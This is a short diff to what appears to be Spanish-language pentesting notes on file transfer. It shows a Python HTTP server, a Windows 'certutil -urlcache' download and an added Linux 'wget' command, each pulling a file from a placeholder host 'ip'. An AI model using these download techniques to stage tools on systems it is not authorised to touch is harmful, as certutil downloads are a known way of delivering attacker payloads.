@@ -33,3 +33,9 @@ python -m http.server 80
 ```bash
 C: > certutil -urlcache -f http://ip/archivo archivo_guardado
 ```
+
+**En Linux**
+
+```bash
+usr@hostname# wget http://ip/archivo
+```
